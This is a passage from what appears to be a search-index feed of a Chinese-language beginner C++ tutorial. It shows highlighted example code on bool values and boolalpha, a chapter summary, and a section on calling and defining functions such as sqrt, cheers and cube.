class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> isReady = <span class="literal">true</span>; <span class="comment">// 声明并初始化为 true</span></span><br><span class="line">    <span class="keyword">bool</span> hasError = <span class="literal">false</span>; <span class="comment">// 声明并初始化为 false</span></span><br><span class="line">    <span class="keyword">bool</span> isEmpty; <span class="comment">// 未初始化 (值不确定)</span></span><br><span class="line"></span><br><span class="line">    isEmpty = <span class="literal">false</span>; <span class="comment">// 赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady (default output): &quot;</span> &lt;&lt; isReady &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 通常输出 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError (default output): &quot;</span> &lt;&lt; hasError &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 通常输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isEmpty (default output): &quot;</span> &lt;&lt; isEmpty &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 std::boolalpha 控制符以 &quot;true&quot;/&quot;false&quot; 形式输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady (boolalpha): &quot;</span> &lt;&lt; isReady &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError (boolalpha): &quot;</span> &lt;&lt; hasError &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isEmpty (boolalpha): &quot;</span> &lt;&lt; isEmpty &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noboolalpha; <span class="comment">// 关闭 boolalpha 格式</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// bool 和整数转换</span></span><br><span class="line">    <span class="keyword">int</span> ready_int = isReady; <span class="comment">// ready_int 变为 1</span></span><br><span class="line">    <span class="keyword">int</span> error_int = hasError; <span class="comment">// error_int 变为 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady as int: &quot;</span> &lt;&lt; ready_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError as int: &quot;</span> &lt;&lt; error_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> from_int_non_zero = <span class="number">100</span>; <span class="comment">// 100 (非零) 转换为 true</span></span><br><span class="line">    <span class="keyword">bool</span> from_int_zero = <span class="number">0</span>;     <span class="comment">// 0 转换为 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bool from 100: &quot;</span> &lt;&lt; from_int_non_zero &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bool from 0: &quot;</span> &lt;&lt; from_int_zero &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在条件语句中使用</span></span><br><span class="line">    <span class="keyword">if</span> (isReady) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;System is ready.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;System is not ready.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hasError) &#123; <span class="comment">// ! 是逻辑非运算符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No errors detected.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;An error occurred.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.5 总结</title>
      <link href="2025/04/26/2.5_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/2.5_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章引导我们迈出了学习C++的第一步，涵盖了编写、编译和理解一个基本C++程序所需的 foundational concepts。</p><p>我们从C++程序的核心——<code>main()</code>函数开始，它是程序的入口点。了解了如何使用注释（<code>//</code> 和 <code>/* */</code>）来提高代码的可读性。接着，我们接触了C++预处理器，特别是 <code>#include</code> 指令，它用于包含头文件（如 <code>&lt;iostream&gt;</code>），这些头文件提供了函数和对象的声明。我们区分了标准库头文件（用 <code>&lt;&gt;</code>）和用户自定义头文件（用 <code>&quot;&quot;</code>）。</p><p>名称空间的概念被引入，特别是 <code>std</code> 名称空间，它包含了C++标准库的大部分内容。我们学习了访问 <code>std</code> 中元素的三种方式：使用 <code>std::</code> 前缀、<code>using</code> 声明和 <code>using</code> 编译指令，并讨论了它们的适用场景和潜在风险。</p><p>我们重点学习了如何使用 <code>iostream</code> 库中的 <code>cout</code> 对象和插入运算符 <code>&lt;&lt;</code> 来显示各种类型的数据（字符串、整数、浮点数等），以及如何使用 <code>endl</code> 或 <code>\n</code> 进行换行。代码格式化的重要性也被强调，以保证代码清晰、易于维护。</p><p>随后，我们学习了C++的基本语句类型。声明语句用于创建变量，指定其类型和名称，并可以选择在声明时进行初始化。赋值语句使用 <code>=</code> 运算符将值存储到变量中。我们还看到了 <code>cout</code> 如何智能地处理不同数据类型，以及如何通过链式调用 <code>&lt;&lt;</code> 来拼接输出。</p><p>输入操作通过 <code>cin</code> 对象和提取运算符 <code>&gt;&gt;</code> 实现，允许程序从用户那里读取数据并存储到变量中。</p><p>最后，我们初步探讨了函数。我们学习了如何调用库函数（如 <code>&lt;cmath&gt;</code> 中的 <code>sqrt()</code>）并使用它们的返回值。我们了解了函数的不同变体（有/无参数，有/无返回值）。更重要的是，我们学习了如何定义自己的函数，包括编写函数原型（声明）和函数定义（实现），以及如何通过函数调用来执行它们。我们还讨论了如何在包含多个函数的程序中管理 <code>std</code> 名称空间的使用。</p><p>通过本章的学习，我们已经能够编写简单的C++程序，实现基本的输入、处理和输出功能，并对C++程序的结构和一些核心概念有了初步的认识。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.4 函数</title>
      <link href="2025/04/26/2.4_%E5%87%BD%E6%95%B0/"/>
      <url>2025/04/26/2.4_%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>函数是C++程序的构建块，它们是执行特定任务的命名代码段。使用函数可以使程序模块化、更易于理解和维护。本节将介绍如何使用和定义函数。</p><h2 id="2-4-1-使用有返回值的函数"><a href="#2-4-1-使用有返回值的函数" class="headerlink" title="2.4.1 使用有返回值的函数"></a>2.4.1 使用有返回值的函数</h2><p>许多C++函数会执行一个操作并返回一个值给调用它的代码。这种函数被称为**有返回值的函数 (Function with Return Value)**。</p><p>我们已经使用过一些有返回值的函数，例如 C++ 标准库 <code>&lt;cmath&gt;</code> (或 C 语言的 <code>&lt;math.h&gt;</code>) 中提供的 <code>sqrt()</code> 函数，它计算一个数的平方根并返回结果。</p><p><strong>使用方法:</strong></p><ol><li> <strong>包含头文件:</strong> 确保包含了提供该函数声明的头文件（例如 <code>&lt;cmath&gt;</code>）。</li><li> <strong>函数调用:</strong> 使用函数名，并在括号 <code>()</code> 内提供所需的**参数 (Argument)**（传递给函数的值）。</li><li> <strong>处理返回值:</strong> 函数调用本身就是一个表达式，其值就是函数的返回值。可以将这个返回值赋给变量、用在更复杂的表达式中或直接输出。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // 包含 cmath 头文件以使用 sqrt() 函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> area;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the floor area, in square feet, of your home: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; area; <span class="comment">// 读取用户输入的面积</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 sqrt() 函数，并将参数 area 传递给它</span></span><br><span class="line">    <span class="comment">// 函数的返回值 (area 的平方根) 被赋给变量 side</span></span><br><span class="line">    <span class="keyword">double</span> side = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(area); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;That&#x27;s the equivalent of a square &quot;</span> &lt;&lt; side </span><br><span class="line">              &lt;&lt; <span class="string">&quot; feet to the side.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 也可以直接在输出语句中使用返回值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The square root of 16 is: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">sqrt</span>(<span class="number">16</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回值可以用在表达式中</span></span><br><span class="line">    <span class="keyword">double</span> hypotenuse = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(<span class="number">3.0</span> * <span class="number">3.0</span> + <span class="number">4.0</span> * <span class="number">4.0</span>); <span class="comment">// 计算直角三角形斜边</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hypotenuse of a 3-4 triangle: &quot;</span> &lt;&lt; hypotenuse &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>std::sqrt(area)</code>: 这是一个函数调用。<code>std::sqrt</code> 是函数名，<code>area</code> 是传递给函数的参数。</li><li>  <code>double side = ...</code>: <code>sqrt()</code> 函数返回一个 <code>double</code> 类型的值，这个值被用来初始化 <code>side</code> 变量。</li></ul><h2 id="2-4-2-函数变体"><a href="#2-4-2-函数变体" class="headerlink" title="2.4.2 函数变体"></a>2.4.2 函数变体</h2><p>函数可以有多种形式：</p><ol><li> <strong>有参数，有返回值:</strong> 如 <code>sqrt(double x)</code>，接收一个 <code>double</code> 参数，返回一个 <code>double</code> 值。</li><li> <strong>无参数，有返回值:</strong> 例如，某些库函数可能读取系统时间并返回一个值，不需要用户提供参数。</li><li> <strong>有参数，无返回值:</strong> 这种函数执行一个操作（如打印到屏幕），但不需要返回任何计算结果。这种函数的返回类型通常声明为 <code>void</code>。我们将在 2.4.3 节看到例子。</li><li> <strong>无参数，无返回值:</strong> 执行一个固定的操作，不接受输入参数也不返回结果，返回类型也是 <code>void</code>。</li></ol><p><strong>示例 (概念性):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // 为了 rand() 和 srand()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;   // 为了 time()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 1: 有参数，有返回值 (我们将在 2.4.4 定义自己的)</span></span><br><span class="line"><span class="comment">// double calculate_something(int input); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 2: 无参数，有返回值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getRandomNumber</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 C 标准库函数生成一个伪随机数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::rand() % <span class="number">100</span>; <span class="comment">// 返回 0-99 之间的随机数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 3: 有参数，无返回值 (我们将在 2.4.3 定义自己的)</span></span><br><span class="line"><span class="comment">// void printMessage(std::string msg); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 4: 无参数，无返回值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showStartupMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program starting...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化随机数生成器 (通常只需一次)</span></span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>)); </span><br><span class="line"></span><br><span class="line">    showStartupMessage(); <span class="comment">// 调用无参数、无返回值的函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> randomNumber = getRandomNumber(); <span class="comment">// 调用无参数、有返回值的函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Random number: &quot;</span> &lt;&lt; randomNumber &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用其他类型的函数 (假设已定义)</span></span><br><span class="line">    <span class="comment">// printMessage(&quot;Processing data...&quot;);</span></span><br><span class="line">    <span class="comment">// double result = calculate_something(10);</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-4-3-用户定义的函数"><a href="#2-4-3-用户定义的函数" class="headerlink" title="2.4.3 用户定义的函数"></a>2.4.3 用户定义的函数</h2><p>除了使用库函数，我们还可以定义自己的函数来执行特定任务。这有助于组织代码和重用代码。</p><p><strong>定义函数的基本结构:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">returnType <span class="title">functionName</span><span class="params">(parameterList)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 函数体: 包含执行任务的语句</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 如果 returnType 不是 void，则需要 return 语句返回一个值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>returnType</code>: 函数执行完毕后返回的数据类型。如果函数不返回值，则使用 <code>void</code>。</li><li>  <code>functionName</code>: 你为函数选择的名称。</li><li>  <code>parameterList</code>: 函数接受的参数列表，包括每个参数的类型和名称。如果没有参数，括号 <code>()</code> 仍然需要，但内部为空。</li><li>  <code>&#123; ... &#125;</code>: 函数体，包含函数的代码。</li></ul><p><strong>函数原型 (Function Prototype):</strong></p><p>在使用函数之前，编译器需要知道函数的接口（返回类型、名称、参数列表）。通常将<strong>函数原型</strong>放在 <code>main()</code> 函数之前或单独的头文件中。原型看起来像函数头，但以分号 <code>;</code> 结尾，可以省略参数名。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">returnType <span class="title">functionName</span><span class="params">(parameterTypeList)</span></span>; <span class="comment">// 函数原型</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例 (定义一个无返回值的函数):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型 (声明)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cheers</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">// 声明 cheers 函数接受一个 int 参数，无返回值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter an integer: &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; count;</span><br><span class="line">    </span><br><span class="line">    cheers(count); <span class="comment">// 函数调用：将 count 的值传递给 cheers 函数</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cheers</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">// 定义 cheers 函数，参数名为 n</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cheers! &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 因为返回类型是 void，所以不需要 return 语句返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>原型:</strong> <code>void cheers(int n);</code> 告诉编译器 <code>main</code> 函数后面会定义一个名为 <code>cheers</code> 的函数。</li><li>  <strong>调用:</strong> <code>cheers(count);</code> 执行 <code>cheers</code> 函数的代码，并将 <code>count</code> 的值复制给 <code>cheers</code> 函数的参数 <code>n</code>（这称为<strong>按值传递</strong>）。</li><li>  <strong>定义:</strong> 提供了 <code>cheers</code> 函数的具体实现。</li></ul><h2 id="2-4-4-用户定义的有返回值的函数"><a href="#2-4-4-用户定义的有返回值的函数" class="headerlink" title="2.4.4 用户定义的有返回值的函数"></a>2.4.4 用户定义的有返回值的函数</h2><p>我们可以定义自己的函数来执行计算并返回结果。只需将 <code>returnType</code> 指定为期望的返回类型，并在函数体中使用 <code>return</code> 语句返回一个该类型的值。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型: 声明 cube 函数接受一个 double 参数，返回一个 double 值</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cube</span><span class="params">(<span class="keyword">double</span> x)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> side;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the side length of a cube: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; side;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> volume = cube(side); <span class="comment">// 调用 cube 函数，将返回值赋给 volume</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A cube with side &quot;</span> &lt;&lt; side &lt;&lt; <span class="string">&quot; has a volume of &quot;</span> </span><br><span class="line">              &lt;&lt; volume &lt;&lt; <span class="string">&quot; cubic units.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以直接使用返回值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The cube of 2.5 is &quot;</span> &lt;&lt; cube(<span class="number">2.5</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cube</span><span class="params">(<span class="keyword">double</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">    <span class="keyword">double</span> result = x * x * x;</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// 返回计算结果 (类型必须与声明的返回类型 double 兼容)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 或者更简洁地：</span></span><br><span class="line">    <span class="comment">// return x * x * x; </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>原型:</strong> <code>double cube(double x);</code> 声明了函数的接口。</li><li>  <strong>调用:</strong> <code>cube(side)</code> 调用函数，<code>side</code> 的值被传递给参数 <code>x</code>。函数执行后返回一个 <code>double</code> 值。</li><li>  <strong>定义:</strong> <code>double cube(double x)</code> 提供了函数的实现。<code>return result;</code> 将计算出的立方值返回给调用者。</li></ul><h2 id="2-4-5-在多函数程序中使用using编译指令"><a href="#2-4-5-在多函数程序中使用using编译指令" class="headerlink" title="2.4.5 在多函数程序中使用using编译指令"></a>2.4.5 在多函数程序中使用using编译指令</h2><p>当程序包含多个函数时，每个函数都需要访问 <code>std</code> 名称空间中的元素（如 <code>cout</code>, <code>cin</code>, <code>endl</code>）。有几种处理方式：</p><ol><li><strong>在每个函数中都使用 <code>std::</code> 前缀:</strong> 这是最安全的方式，尤其是在头文件中，但可能使代码冗长。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from func1\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input in func2: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>在每个需要访问 <code>std</code> 的函数内部使用 <code>using</code> 声明或 <code>using namespace std;</code>:</strong> 这将 <code>using</code> 的作用域限制在函数内部，减少了命名冲突的风险。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 